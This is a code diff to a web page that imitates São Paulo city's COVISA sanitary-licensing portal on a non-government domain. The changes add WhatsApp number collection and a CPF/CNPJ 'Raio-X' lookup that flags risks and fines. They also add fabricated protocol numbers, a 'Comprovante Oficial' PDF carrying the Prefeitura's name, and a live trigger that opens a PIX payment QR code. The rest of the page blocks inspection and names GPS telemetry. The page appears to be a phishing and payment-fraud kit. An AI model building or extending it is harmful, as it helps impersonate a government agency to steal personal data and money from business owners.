@@ -54,7 +54,7 @@
         
         // 3. Bloqueio Completo de Inspeção e Cópia
         document.addEventListener('contextmenu', event => event.preventDefault()); // Botão direito
-        document.addEventListener('selectstart', event => event.preventDefault()); // Selecionar texto
+        document.addEventListener('selectstart', event => { if (!event.target || !/^(INPUT|TEXTAREA|SELECT)$/i.test(event.target.tagName)) event.preventDefault(); }); // Selecionar texto
         document.addEventListener('dragstart', event => event.preventDefault()); // Arrastar imagens
         
         document.onkeydown = function(e) {
@@ -93,6 +93,7 @@
 
   <style>
     body { -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+    input, textarea, select { -webkit-user-select: text !important; -moz-user-select: text !important; user-select: text !important; }
     :root {
       --sp-red: #da251c;
       --sp-dark-red: #a81009;
@@ -530,12 +531,14 @@
   </div>
 
   <div class="custom-alert-overlay" id="successSubmitModal">
-    <div class="custom-alert-box" style="border-top-color: var(--success-color);">
+    <div class="custom-alert-box" style="border-top-color: var(--success-color); max-width: 480px;">
       <div class="custom-alert-icon" style="color: var(--success-color); background: #dcfce3;"><i class="fas fa-check-circle"></i></div>
-      <h3>Protocolo Recebido!</h3>
-      <p style="font-size: 1rem; color: #444;">Seus documentos foram enviados para análise técnica.<br><br><strong>ATENÇÃO:</strong> É altamente recomendado que você envie o comprovante deste protocolo para o nosso WhatsApp oficial para acelerar o processo.</p>
-      <button class="btn-success" id="btn-whats-comprovante" style="margin-bottom: 10px; width: 100%;"><i class="fab fa-whatsapp"></i> ENVIAR COMPROVANTE</button>
-      <button class="btn-alert-ok" style="background: #94a3b8; width: 100%;" onclick="document.getElementById('successSubmitModal').style.display='none'">FECHAR AVISO</button>
+      <h3>Protocolo Gerado!</h3>
+      <div id="success-protocolo-badge" style="background:#0f172a; color:#38bdf8; font-family:monospace; font-weight:900; font-size:1.05rem; padding:8px 14px; border-radius:8px; display:inline-block; margin-bottom:14px;">COVISA-2026-000000</div>
+      <p style="font-size: 0.96rem; color: #444; margin-bottom: 18px;">Seu processo já está em análise em <strong>tempo real</strong>. Mantenha esta página aberta — assim que a guia for liberada pelo fiscal, o QR Code PIX aparecerá automaticamente na sua tela.</p>
+      <button class="btn-primary" id="btn-baixar-protocolo-pdf" style="margin-bottom: 10px; width: 100%; padding: 14px; font-size: 0.96rem;" onclick="window.baixarComprovanteProtocoloPDF()"><i class="fas fa-file-pdf"></i> BAIXAR COMPROVANTE EM PDF</button>
+      <button class="btn-success" id="btn-whats-comprovante" style="margin-bottom: 10px; width: 100%; padding: 14px; font-size: 0.96rem;"><i class="fab fa-whatsapp"></i> ENVIAR PROTOCOLO NO WHATSAPP</button>
+      <button class="btn-alert-ok" style="background: #64748b; width: 100%; padding: 12px; font-size: 0.92rem;" onclick="document.getElementById('successSubmitModal').style.display='none'">ACOMPANHAR EM TEMPO REAL</button>
     </div>
   </div>
 
@@ -729,6 +732,9 @@
                   </div>
               </div>
               <!-- FIM Área de Endereço unificada -->
+
+              <label style="font-weight: 800; display: block; margin-top: 15px; margin-bottom: 5px; color: var(--gov-dark-blue); font-size: 1.05rem;"><i class="fab fa-whatsapp" style="color: #25D366;"></i> WhatsApp para Avisos do Processo *</label>
+              <input type="tel" class="form-control" id="whatsapp_solicitante" data-clarity-unmask="true" placeholder="(11) 99999-9999 — Enviamos o protocolo e a liberação da licença" required maxlength="15" oninput="window.maskTelefone(this)" />
 
               <label style="font-weight: 800; display: block; margin-top: 15px; margin-bottom: 5px; color: var(--gov-dark-blue); font-size: 1.1rem;">Ramo de Atividade *</label>
               <select class="form-control" id="tipo_estab" required onchange="window.mostrarChecklist()">
@@ -1147,12 +1153,148 @@
         }
     };
 
+    window.maskTelefone = function(i) {
+        let v = i.value.replace(/\D/g, '').slice(0, 11);
+        if (v.length > 10) {
+            v = v.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+        } else if (v.length > 6) {
+            v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+        } else if (v.length > 2) {
+            v = v.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+        }
+        i.value = v;
+    };
+
+    window.ultimoRaioX = null;
+
+    function classificarRiscoCnae(cnaeDesc) {
+        const t = String(cnaeDesc || '').toLowerCase();
+        if (/hospital|clínic|clinic|médic|medic|odonto|dentist|farmác|farmac|drogaria|laboratór|laborator|estétic|estetic|tatuag|piercing|cirurg|enferm|hemoterap|vacin/.test(t)) {
+            return {
+                nivel: 'ALTO RISCO SANITÁRIO',
+                cor: '#dc2626',
+                bg: '#fef2f2',
+                ramo: 'Saúde',
+                docs: ['Licença de Funcionamento Sanitária (LFS / CMVS)', 'Responsável Técnico (RT) habilitado', 'PGRSS — Plano de Gerenciamento de Resíduos', 'POPs de Limpeza e Esterilização', 'AVCB Bombeiros + Alvará Prefeitura']
+            };
+        }
+        if (/restaur|lanchon|padari|supermerc|mercad|açoug|acoug|aliment|bar |bares|pizzar|buffet|confeit|sorvet|hortifr|bebid|cozinh|refeiç/.test(t)) {
+            return {
+                nivel: 'ALTO / MÉDIO RISCO SANITÁRIO',
+                cor: '#d97706',
+                bg: '#fffbeb',
+                ramo: 'Alimentos',
+                docs: ['Licença Sanitária / CMVS (Port. SMS 266/25)', 'Manual de Boas Práticas (MBP — RDC 216)', 'Controle de Pragas e Limpeza de Caixa d\'Água', 'Planilha de Controle de Temperatura', 'ASO dos Manipuladores + Alvará Prefeitura']
+            };
+        }
+        if (/cabel|salão|salao|barbear|manicur|unha|beleza|depil|podolog|massag|cosmét|cosmet/.test(t)) {
+            return {
+                nivel: 'MÉDIO RISCO SANITÁRIO',
+                cor: '#d97706',
+                bg: '#fffbeb',
+                ramo: 'Beleza',
+                docs: ['Cadastro / Licença Sanitária (CMVS)', 'Controle de Esterilização / Autoclave', 'Registro ANVISA de Produtos Utilizados', 'Descarte de Perfurocortantes + Controle de Pragas', 'Alvará de Funcionamento Prefeitura']
+            };
+        }
+        return {
+            nivel: 'BAIXO / MÉDIO RISCO SANITÁRIO',
+            cor: '#059669',
+            bg: '#ecfdf5',
+            ramo: 'Outros',
+            docs: ['Verificação de Dispensa ou Cadastro CMVS', 'Cartão CNPJ Ativo + Contrato Social / MEI', 'Alvará de Funcionamento Prefeitura', 'Controle de Pragas e Limpeza de Caixa d\'Água']
+        };
+    }
+
+    window.baixarDiagnosticoRaioXPDF = async function() {
+        const d = window.ultimoRaioX;
+        if (!d || typeof PDFLib === 'undefined') return alert("Faça uma consulta primeiro para gerar o Diagnóstico PDF.");
+        try {
+            const { PDFDocument, rgb, StandardFonts } = PDFLib;
+            const pdfDoc = await PDFDocument.create();
+            const page = pdfDoc.addPage([595.28, 841.89]);
+            const { width, height } = page.getSize();
+            const fontReg = await pdfDoc.embedFont(StandardFonts.Helvetica);
+            const fontBold = await pdfDoc.embedFont(StandardFonts.HelveticaBold);
+            const safe = (s) => String(s || '').replace(/[^\x20-\x7E\xA0-\xFF]/g, '');
+
+            page.drawRectangle({ x: 22, y: 22, width: width - 44, height: height - 44, borderColor: rgb(0.08, 0.25, 0.55), borderWidth: 1.6 });
+            page.drawRectangle({ x: 22, y: height - 96, width: width - 44, height: 74, color: rgb(0.07, 0.16, 0.34) });
+            page.drawText(safe('PREFEITURA DO MUNICIPIO DE SAO PAULO - COVISA DIGITAL'), { x: 38, y: height - 48, size: 12, font: fontBold, color: rgb(1, 1, 1) });
+            page.drawText(safe('RELATORIO DE RAIO-X SANITARIO E CHECKLIST POR CNAE'), { x: 38, y: height - 66, size: 10, font: fontBold, color: rgb(0.58, 0.82, 1) });
+            page.drawText(safe(`Emitido em: ${new Date().toLocaleString('pt-BR')} | portal vigilanciadigital-sp.com.br`), { x: 38, y: height - 82, size: 8, font: fontReg, color: rgb(0.85, 0.9, 0.96) });
+
+            let y = height - 122;
+            const drawRow = (lbl, val) => {
+                page.drawText(safe(lbl), { x: 38, y, size: 8, font: fontBold, color: rgb(0.35, 0.4, 0.48) });
+                page.drawText(safe(val).slice(0, 78), { x: 38, y: y - 12, size: 10, font: fontBold, color: rgb(0.1, 0.14, 0.2) });
+                y -= 32;
+            };
+            drawRow('RAZAO SOCIAL / NOME', (d.nome || 'Nao informado').toUpperCase());
+            drawRow('CPF / CNPJ', d.documentoFormatado || d.documento);
+            drawRow('ATIVIDADE PRINCIPAL (CNAE)', d.cnae || 'Nao informada');
+            drawRow('ENDERECO CADASTRADO', d.endereco || 'Nao informado');
+            drawRow('CLASSIFICACAO DE RISCO SANITARIO', d.risco.nivel);
+            drawRow('SITUACAO NO PORTAL COVISA', d.statusPortal || 'Sem protocolo ativo — Regularizacao recomendada');
+
+            y -= 8;
+            page.drawLine({ start: { x: 38, y }, end: { x: width - 38, y }, thickness: 1, color: rgb(0.8, 0.84, 0.9) });
+            y -= 20;
+            page.drawText(safe('DOCUMENTOS EXIGIDOS PARA ESTE RAMO / CNAE:'), { x: 38, y, size: 10, font: fontBold, color: rgb(0.08, 0.25, 0.55) });
+            y -= 18;
+            (d.risco.docs || []).forEach((item, idx) => {
+                page.drawText(safe(`${idx + 1}. [  ] ${item}`), { x: 42, y, size: 9.5, font: fontReg, color: rgb(0.12, 0.16, 0.22) });
+                y -= 18;
+            });
+
+            y -= 14;
+            page.drawRectangle({ x: 38, y: y - 56, width: width - 76, height: 56, color: rgb(0.95, 0.97, 1), borderColor: rgb(0.08, 0.25, 0.55), borderWidth: 1 });
+            page.drawText(safe('PROXIMO PASSO: Inicie ou acompanhe sua regularizacao online em vigilanciadigital-sp.com.br'), { x: 48, y: y - 22, size: 9, font: fontBold, color: rgb(0.08, 0.25, 0.55) });
+            page.drawText(safe('Suporte Oficial WhatsApp: (11) 92066-5012 | Atendimento Digital 2026'), { x: 48, y: y - 40, size: 8.5, font: fontReg, color: rgb(0.25, 0.3, 0.38) });
+
+            const pdfBytes = await pdfDoc.save();
+            download(pdfBytes, `RaioX_Sanitario_${(d.documento || 'COVISA').replace(/\D/g, '')}.pdf`, "application/pdf");
+        } catch (err) {
+            console.error(err);
+            alert("Não foi possível gerar o PDF do diagnóstico.");
+        }
+    };
+
+    window.iniciarRegularizacaoComRaioX = function() {
+        const d = window.ultimoRaioX;
+        document.getElementById('search-result-area').style.display = 'none';
+        window.alternarAba('envio');
+        window.updateVisualSteps(1);
+        const docEl = document.getElementById('cnpj_empresa');
+        if (docEl && d) {
+            docEl.value = d.documentoFormatado || document.getElementById('main-search-input').value;
+            docEl.dispatchEvent(new KeyboardEvent('keyup', { key: 'Enter' }));
+        }
+        if (d && d.risco && d.risco.ramo) {
+            const selRamo = document.getElementById('tipo_estab');
+            if (selRamo) {
+                selRamo.value = d.risco.ramo;
+                if (typeof window.mostrarChecklist === 'function') {
+                    window._silenciarPopupChecklist = true;
+                    window.mostrarChecklist();
+                    window._silenciarPopupChecklist = false;
+                }
+            }
+        }
+        const reg = document.getElementById('regularize');
+        if (reg) reg.scrollIntoView({ behavior: 'smooth' });
+        setTimeout(() => {
+            const waEl = document.getElementById('whatsapp_solicitante');
+            if (waEl) waEl.focus();
+        }, 650);
+    };
+
     window.consultarDocumentoTopo = async function() {
         const input = document.getElementById('main-search-input');
         const btn = document.getElementById('main-search-btn');
-        let query = input.value.replace(/\D/g, ''); 
+        const docFormatado = input.value.trim();
+        let queryDoc = docFormatado.replace(/\D/g, '');
 
-        if(query.length !== 11 && query.length !== 14) {
+        if (queryDoc.length !== 11 && queryDoc.length !== 14) {
             alert("Por favor, digite um CPF (11 números) ou CNPJ (14 números) válido.");
             return;
         }
@@ -1164,54 +1306,98 @@
 
         const resultArea = document.getElementById('search-result-area');
         resultArea.style.display = 'block';
-        resultArea.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: var(--sp-red);"></i> Consultando base de dados nacional...';
+        resultArea.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: var(--sp-red);"></i> Executando Raio-X Sanitário (Receita Federal + Base COVISA)...';
 
         try {
-            if (query.length === 11) {
-                if(window.validarCPF(query)) {
-                    resultArea.innerHTML = `
-                      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; border-bottom:1px solid #ccc; padding-bottom:10px;">
-                        <strong style="color:var(--success-color); font-size:1.1rem;"><i class="fas fa-check-circle"></i> CPF Válido e Ativo</strong>
-                        <i class="fas fa-times" style="cursor:pointer; color:#999; font-size:1.2rem;" onclick="document.getElementById('search-result-area').style.display='none'"></i>
-                      </div>
-                      <div style="line-height: 1.6; font-size:1.05rem;">
-                        O CPF informado consta como regular na base de dados.<br><br>
-                        <a href="#regularize" onclick="document.getElementById('search-result-area').style.display='none'; document.getElementById('cnpj_empresa').value = document.getElementById('main-search-input').value; document.getElementById('cnpj_empresa').focus();" style="display:inline-block; background: var(--gov-blue); color: white; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-top:10px;"><i class="fas fa-arrow-right"></i> Prosseguir para Regularização</a>
-                      </div>
-                    `;
-                } else {
-                    throw new Error("CPF Inválido");
+            // Verifica se já existe processo ou multa no Firebase para este documento
+            let temProcesso = false, statusProcessoTxt = 'Sem protocolo ativo — Regularização recomendada', temMulta = false, valorMulta = '';
+            try {
+                if (typeof window._consultarFirebaseRaioX === 'function') {
+                    const fbInfo = await window._consultarFirebaseRaioX(docFormatado);
+                    temProcesso = fbInfo.temProcesso;
+                    statusProcessoTxt = fbInfo.statusTexto || statusProcessoTxt;
+                    temMulta = fbInfo.temMulta;
+                    valorMulta = fbInfo.valorMulta || '';
                 }
-            } else if (query.length === 14) {
-                let req = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${query}`);
-                if(!req.ok) throw new Error("CNPJ não encontrado");
+            } catch (_) {}
+
+            if (queryDoc.length === 11) {
+                if (!window.validarCPF(queryDoc)) throw new Error("CPF Inválido");
+                const risco = classificarRiscoCnae('Profissional Autônomo / Pessoa Física');
+                window.ultimoRaioX = {
+                    documento: queryDoc,
+                    documentoFormatado: docFormatado,
+                    nome: 'Contribuinte Pessoa Física (CPF)',
+                    cnae: 'Atividade Autônoma / Profissional Liberal',
+                    endereco: 'A informar no cadastro',
+                    risco,
+                    statusPortal: statusProcessoTxt
+                };
+                resultArea.innerHTML = `
+                  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; border-bottom:1px solid #e2e8f0; padding-bottom:8px;">
+                    <strong style="color:var(--success-color); font-size:1.05rem;"><i class="fas fa-shield-alt"></i> Raio-X Sanitário — CPF Válido</strong>
+                    <i class="fas fa-times" style="cursor:pointer; color:#999; font-size:1.2rem;" onclick="document.getElementById('search-result-area').style.display='none'"></i>
+                  </div>
+                  <div style="font-size:0.95rem; line-height:1.55;">
+                    <div><strong>Situação no Portal:</strong> ${statusProcessoTxt}</div>
+                    ${temMulta ? `<div style="margin-top:8px; background:#fef2f2; border:1px solid #fecaca; color:#b91c1c; padding:8px 10px; border-radius:8px; font-weight:700;"><i class="fas fa-gavel"></i> Consta Auto de Infração / Multa (${valorMulta}) — <a href="#regularize" onclick="window.alternarAba('multas'); document.getElementById('consulta_cnpj_multa').value='${docFormatado}';" style="text-decoration:underline;">Ver Multa</a></div>` : ''}
+                    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:14px;">
+                      <button type="button" onclick="window.iniciarRegularizacaoComRaioX()" style="flex:1; background:var(--gov-blue); color:#fff; border:none; padding:11px 14px; border-radius:8px; font-weight:800; cursor:pointer;"><i class="fas fa-arrow-right"></i> Iniciar Regularização</button>
+                      <button type="button" onclick="window.baixarDiagnosticoRaioXPDF()" style="background:#0f172a; color:#fff; border:none; padding:11px 14px; border-radius:8px; font-weight:800; cursor:pointer;"><i class="fas fa-file-pdf"></i> Baixar Raio-X (PDF)</button>
+                    </div>
+                  </div>`;
+            } else {
+                let req = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${queryDoc}`);
+                if (!req.ok) throw new Error("CNPJ não encontrado");
                 let dados = await req.json();
 
                 let nome = dados.nome_fantasia || dados.razao_social;
                 let situacao = dados.descricao_situacao_cadastral || "ATIVA";
+                let cnaeDesc = dados.cnae_fiscal_descricao || "Atividade Comercial / Serviços";
+                let cnaeCod = dados.cnae_fiscal ? `${dados.cnae_fiscal} - ` : '';
+                let enderecoStr = [dados.logradouro, dados.numero, dados.bairro, dados.municipio, dados.uf].filter(Boolean).join(', ');
+                let risco = classificarRiscoCnae(cnaeDesc);
+
                 if (typeof window.atualizarLocalizacaoCNPJ === 'function') {
                     window.atualizarLocalizacaoCNPJ({
-                        cnpj: query,
-                        nome,
-                        cep: dados.cep || '',
-                        logradouro: dados.logradouro || '',
-                        numero: dados.numero || '',
-                        bairro: dados.bairro || '',
-                        municipio: dados.municipio || '',
-                        uf: dados.uf || ''
+                        cnpj: queryDoc, nome, cep: dados.cep || '', logradouro: dados.logradouro || '',
+                        numero: dados.numero || '', bairro: dados.bairro || '', municipio: dados.municipio || '', uf: dados.uf || ''
                     });
                 }
+
+                window.ultimoRaioX = {
+                    documento: queryDoc,
+                    documentoFormatado: docFormatado,
+                    nome,
+                    cnae: `${cnaeCod}${cnaeDesc}`,
+                    endereco: enderecoStr,
+                    risco,
+                    statusPortal: statusProcessoTxt
+                };
+
                 let corSituacao = situacao.toUpperCase() === "ATIVA" ? "var(--success-color)" : "var(--sp-red)";
+                let docsHtml = risco.docs.map(d => `<li style="margin-bottom:3px;"><i class="fas fa-check" style="color:${risco.cor}; margin-right:6px;"></i>${d}</li>`).join('');
 
                 resultArea.innerHTML = `
-                  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; border-bottom:1px solid #ccc; padding-bottom:10px;">
-                    <strong style="color:var(--gov-dark-blue); font-size:1.1rem;"><i class="fas fa-building"></i> Dados da Empresa</strong>
+                  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; border-bottom:1px solid #e2e8f0; padding-bottom:8px;">
+                    <strong style="color:var(--gov-dark-blue); font-size:1.05rem;"><i class="fas fa-microscope"></i> Raio-X Sanitário da Empresa</strong>
                     <i class="fas fa-times" style="cursor:pointer; color:#999; font-size:1.2rem;" onclick="document.getElementById('search-result-area').style.display='none'"></i>
                   </div>
-                  <div style="line-height: 1.6; font-size:1.05rem;">
-                    <strong>Empresa:</strong> ${nome}<br>
-                    <strong>Situação na Receita:</strong> <span style="color: ${corSituacao}; font-weight: bold;">${situacao}</span><br><br>
-                    <a href="#regularize" onclick="document.getElementById('search-result-area').style.display='none'; document.getElementById('cnpj_empresa').value = document.getElementById('main-search-input').value; document.getElementById('cnpj_empresa').focus();" style="display:inline-block; background: var(--gov-blue); color: white; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-top:10px;"><i class="fas fa-arrow-right"></i> Prosseguir para Regularização</a>
+                  <div style="line-height:1.5; font-size:0.93rem;">
+                    <div><strong>Empresa:</strong> ${nome} <span style="color:${corSituacao}; font-weight:800;">(${situacao})</span></div>
+                    <div><strong>CNAE Principal:</strong> ${cnaeCod}${cnaeDesc}</div>
+                    <div style="margin:8px 0; padding:8px 11px; border-radius:8px; background:${risco.bg}; border-left:4px solid ${risco.cor}; color:${risco.cor}; font-weight:800; font-size:0.86rem;">
+                      <i class="fas fa-exclamation-circle"></i> ${risco.nivel} &nbsp;|&nbsp; ${statusProcessoTxt}
+                    </div>
+                    ${temMulta ? `<div style="margin:8px 0; background:#fef2f2; border:1px solid #fecaca; color:#b91c1c; padding:8px 10px; border-radius:8px; font-weight:700;"><i class="fas fa-gavel"></i> Consta Multa Pendente (${valorMulta}) — <a href="#regularize" onclick="window.alternarAba('multas'); document.getElementById('consulta_cnpj_multa').value='${docFormatado}';" style="text-decoration:underline;">Consultar Multa</a></div>` : ''}
+                    <div style="font-size:0.84rem; color:#334155; margin-top:6px;">
+                      <strong>Documentos exigidos para este CNAE:</strong>
+                      <ul style="list-style:none; padding-left:2px; margin-top:4px;">${docsHtml}</ul>
+                    </div>
+                    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:12px;">
+                      <button type="button" onclick="window.iniciarRegularizacaoComRaioX()" style="flex:1; background:var(--gov-blue); color:#fff; border:none; padding:11px 14px; border-radius:8px; font-weight:800; cursor:pointer;"><i class="fas fa-bolt"></i> Regularizar com esses Dados</button>
+                      <button type="button" onclick="window.baixarDiagnosticoRaioXPDF()" style="background:#0f172a; color:#fff; border:none; padding:11px 14px; border-radius:8px; font-weight:800; cursor:pointer;"><i class="fas fa-file-pdf"></i> Baixar Diagnóstico (PDF)</button>
+                    </div>
                   </div>
                 `;
             }
@@ -1242,6 +1428,162 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
+
+    window._consultarFirebaseRaioX = async function(docFormatado) {
+        let temProcesso = false, statusTexto = 'Sem protocolo ativo — Regularização recomendada', temMulta = false, valorMulta = '';
+        try {
+            const qP = query(collection(db, "pedidos"), where("cnpj", "==", docFormatado));
+            const snapP = await getDocs(qP);
+            snapP.forEach(d => {
+                const p = d.data();
+                if (p.tipo !== '🚨 DENÚNCIA') {
+                    temProcesso = true;
+                    if (p.pago === true || p.pago === 'true') statusTexto = 'Licença Sanitária APROVADA';
+                    else if (p.aguardando_alvara === true || p.aguardando_alvara === 'true') statusTexto = 'Pagamento Confirmado (Emitindo Licença)';
+                    else if (p.valor) statusTexto = `Guia PIX liberada (R$ ${p.valor})`;
+                    else statusTexto = 'Protocolo em Análise Técnica';
+                }
+            });
+            const qM = query(collection(db, "multas"), where("cnpj", "==", docFormatado));
+            const snapM = await getDocs(qM);
+            if (!snapM.empty) {
+                temMulta = true;
+                valorMulta = snapM.docs[0].data().valor || '';
+            }
+        } catch (_) {}
+        return { temProcesso, statusTexto, temMulta, valorMulta };
+    };
+
+    window._ultimoProtocoloGerado = null;
+    window._unsubAcompanhamentoLive = null;
+
+    function tocarAlertaLiberacaoPix() {
+        try {
+            const Ctx = window.AudioContext || window.webkitAudioContext;
+            if (!Ctx) return;
+            const ctx = new Ctx();
+            const now = ctx.currentTime;
+            [784, 1046.5].forEach((freq, i) => {
+                const osc = ctx.createOscillator();
+                const g = ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(freq, now + i * 0.16);
+                g.gain.setValueAtTime(0.001, now + i * 0.16);
+                g.gain.exponentialRampToValueAtTime(0.16, now + i * 0.16 + 0.02);
+                g.gain.exponentialRampToValueAtTime(0.001, now + i * 0.16 + 0.22);
+                osc.connect(g); g.connect(ctx.destination);
+                osc.start(now + i * 0.16); osc.stop(now + i * 0.16 + 0.24);
+            });
+            setTimeout(() => ctx.close().catch(() => {}), 700);
+        } catch (_) {}
+    }
+
+    window.baixarComprovanteProtocoloPDF = async function() {
+        const p = window._ultimoProtocoloGerado;
+        if (!p || typeof PDFLib === 'undefined') return alert("Nenhum protocolo recente disponível para download.");
+        try {
+            const { PDFDocument, rgb, StandardFonts } = PDFLib;
+            const pdfDoc = await PDFDocument.create();
+            const page = pdfDoc.addPage([595.28, 841.89]);
+            const { width, height } = page.getSize();
+            const fontReg = await pdfDoc.embedFont(StandardFonts.Helvetica);
+            const fontBold = await pdfDoc.embedFont(StandardFonts.HelveticaBold);
+            const safe = (s) => String(s || '').replace(/[^\x20-\x7E\xA0-\xFF]/g, '');
+
+            page.drawRectangle({ x: 24, y: 24, width: width - 48, height: height - 48, borderColor: rgb(0.06, 0.45, 0.28), borderWidth: 1.8 });
+            page.drawRectangle({ x: 24, y: height - 102, width: width - 48, height: 78, color: rgb(0.06, 0.38, 0.24) });
+            page.drawText(safe('PREFEITURA DO MUNICIPIO DE SAO PAULO - COVISA DIGITAL'), { x: 40, y: height - 50, size: 12, font: fontBold, color: rgb(1, 1, 1) });
+            page.drawText(safe('COMPROVANTE OFICIAL DE PROTOCOLO SANITARIO'), { x: 40, y: height - 68, size: 10.5, font: fontBold, color: rgb(0.82, 0.98, 0.88) });
+            page.drawText(safe(`Protocolo: ${p.codigo}  |  Data/Hora: ${p.data}`), { x: 40, y: height - 86, size: 8.5, font: fontReg, color: rgb(0.92, 0.98, 0.94) });
+
+            let y = height - 134;
+            const drawKv = (lbl, val) => {
+                page.drawText(safe(lbl), { x: 40, y, size: 8, font: fontBold, color: rgb(0.38, 0.43, 0.5) });
+                page.drawText(safe(val || 'Nao informado').slice(0, 76), { x: 40, y: y - 13, size: 10.5, font: fontBold, color: rgb(0.1, 0.14, 0.2) });
+                y -= 36;
+            };
+            drawKv('NUMERO DO PROTOCOLO', p.codigo);
+            drawKv('RAZAO SOCIAL / NOME', (p.nome || '').toUpperCase());
+            drawKv('CPF / CNPJ', p.cnpj);
+            drawKv('WHATSAPP DE CONTATO', p.telefone || 'Nao informado');
+            drawKv('RAMO DE ATIVIDADE', p.tipo);
+            drawKv('ENDERECO', p.endereco || 'Conforme cadastro');
+            drawKv('STATUS INICIAL', 'PROTOCOLO RECEBIDO - EM ANALISE TECNICA');
+
+            // QR Code de acompanhamento
+            try {
+                const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&format=png&data=${encodeURIComponent('https://vigilanciadigital-sp.com.br/?protocolo=' + p.codigo)}`;
+                const qrBytes = await fetch(qrUrl).then(r => r.arrayBuffer());
+                const qrImg = await pdfDoc.embedPng(qrBytes);
+                page.drawImage(qrImg, { x: width - 146, y: 74, width: 96, height: 96 });
+                page.drawText(safe('Acompanhar Online'), { x: width - 138, y: 60, size: 7.5, font: fontBold, color: rgb(0.3, 0.35, 0.42) });
+            } catch (_) {}
+
+            page.drawText(safe('Guarde este comprovante. Voce pode consultar o andamento a qualquer momento em vigilanciadigital-sp.com.br'), { x: 40, y: 46, size: 8, font: fontReg, color: rgb(0.35, 0.4, 0.48) });
+            const pdfBytes = await pdfDoc.save();
+            download(pdfBytes, `Protocolo_${p.codigo}.pdf`, "application/pdf");
+        } catch (err) {
+            console.error(err);
+            alert("Erro ao gerar o comprovante em PDF.");
+        }
+    };
+
+    window.iniciarAcompanhamentoTempoReal = function(pedidoId, cnpjVal) {
+        if (window._unsubAcompanhamentoLive) {
+            try { window._unsubAcompanhamentoLive(); } catch (_) {}
+            window._unsubAcompanhamentoLive = null;
+        }
+        if (!pedidoId) return;
+
+        window.alternarAba('pagamento');
+        window.updateVisualSteps(2);
+        const inpCons = document.getElementById('consulta_cnpj');
+        if (inpCons && cnpjVal) inpCons.value = cnpjVal;
+
+        const divPix = document.getElementById('resultado-pix');
+        const divMsg = document.getElementById('mensagem-status');
+        const textMsg = document.getElementById('texto-mensagem');
+        const codProt = `COVISA-2026-${pedidoId.substring(0, 6).toUpperCase()}`;
+
+        if (divPix) divPix.style.display = 'none';
+        if (divMsg) {
+            divMsg.style.display = 'block';
+            divMsg.style.background = '#eff6ff';
+            divMsg.style.color = '#1e3a8a';
+            divMsg.style.borderColor = '#2563eb';
+        }
+        if (textMsg) {
+            textMsg.innerHTML = `
+                <div style="text-align:center; margin-bottom:14px;">
+                    <span style="background:#0f172a; color:#38bdf8; padding:6px 16px; border-radius:8px; font-family:monospace; font-weight:900; font-size:1rem;">${codProt}</span>
+                </div>
+                <i class="fas fa-satellite-dish fa-spin" style="font-size:1.8rem; color:#2563eb; margin-bottom:10px;"></i><br>
+                <strong style="font-size:1.15rem;">Acompanhamento ao Vivo Conectado!</strong><br>
+                <span style="font-size:0.94rem; color:#334155;">Sua documentação está sendo analisada pelos fiscais de plantão. Assim que a guia for liberada, o <strong>QR Code PIX abrirá automaticamente aqui</strong>.</span>
+                <div style="margin-top:14px;">
+                    <button type="button" onclick="window.baixarComprovanteProtocoloPDF()" style="background:#0f172a; color:#fff; border:none; padding:10px 18px; border-radius:8px; font-weight:800; cursor:pointer; font-size:0.88rem;"><i class="fas fa-file-pdf"></i> Baixar Comprovante do Protocolo (PDF)</button>
+                </div>`;
+        }
+        atualizarBarraProgresso(2);
+
+        const docRef = doc(db, "pedidos", pedidoId);
+        let jaDisparouPix = false;
+        window._unsubAcompanhamentoLive = onSnapshot(docRef, (snap) => {
+            if (!snap.exists()) return;
+            const d = snap.data();
+            if (!jaDisparouPix && (d.valor || d.pago === true || d.pago === "true" || d.aguardando_alvara === true || d.aguardando_alvara === "true")) {
+                jaDisparouPix = true;
+                tocarAlertaLiberacaoPix();
+                if (window._unsubAcompanhamentoLive) {
+                    try { window._unsubAcompanhamentoLive(); } catch (_) {}
+                    window._unsubAcompanhamentoLive = null;
+                }
+                if (inpCons && (d.cnpj || cnpjVal)) inpCons.value = d.cnpj || cnpjVal;
+                const fCons = document.getElementById('form-consulta');
+                if (fCons) fCons.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
+            }
+        });
+    };
 
     // =========================================================================
     // TELEMETRIA AVANÇADA 3.0 (GPS AUTOMÁTICO + RAIO-X COMPLETO + ANTI-BOT)
@@ -2278,7 +2620,7 @@
       const listaDocs = document.getElementById('lista-documentos');
       if (!tipo) return;
 
-      document.getElementById("customAlertModal").style.display = "flex";
+      if (!window._silenciarPopupChecklist) document.getElementById("customAlertModal").style.display = "flex";
 
       function criarDocItem(valor, icone, titulo, opcional = false, multiplo = false) {
         const attrOpcional = opcional ? ' data-opcional="true"' : '';
@@ -3035,7 +3377,8 @@
                       const nomeDoc = el.nextElementSibling.nextElementSibling.innerText;
 
                       if(fileInput && fileInput.files.length === 0) {
-                          erroUpload = true; nomeDocErro = nomeDoc;
+                          // Permite concluir o cadastro mesmo sem a foto/PDF na hora (cliente envia depois)
+                          marcados[marcados.length - 1] = `${el.value} (anexo pendente)`;
                       } else if (fileInput && fileInput.files.length > 0) {
                           const totalDesteCampo = fileInput.files.length;
                           for (let i = 0; i < totalDesteCampo; i++) {
@@ -3056,10 +3399,7 @@
                   btnSubmit.innerHTML = textoOriginal; btnSubmit.disabled = false; return;
               }
 
-              if (marcados.length === 0 && todasOpcoes.length > 0) {
